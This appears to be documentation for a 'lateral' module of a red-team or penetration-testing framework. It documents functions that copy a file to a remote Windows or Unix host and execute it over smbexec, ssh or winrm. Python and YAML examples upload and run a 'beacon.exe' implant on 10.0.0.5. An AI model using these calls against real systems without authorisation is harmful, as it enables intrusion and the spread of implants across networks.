# Lateral

Thin wrappers over registered post runners for copy-and-exec tasks.

## Functions

- `copy_and_exec(target, src, dst, method="smbexec", command=None, **runner_kwargs) -> str`: Upload `src` to `dst` on target using a post runner (e.g., `smbexec`, `ssh`, `winrm`) then execute `command or dst`.
- `exec_command(target, command, method="ssh", **runner_kwargs) -> str`: Run a single command via the chosen runner.

## Python Usage

```python
from ofx.lib import lateral
out = lateral.copy_and_exec("10.0.0.5", "./beacon.exe", "C:\\Temp\\b.exe", method="smbexec")
print(out)
```

## Workflow Snippet

```yaml
steps:
  - name: copy and run
    module: python
    with:
      script: |
        from ofx.lib import lateral
        out = lateral.copy_and_exec(
            "10.0.0.5",
            "./beacon.exe",
            "C:\\Temp\\b.exe",
            method="smbexec",
        )
        print(out)
```
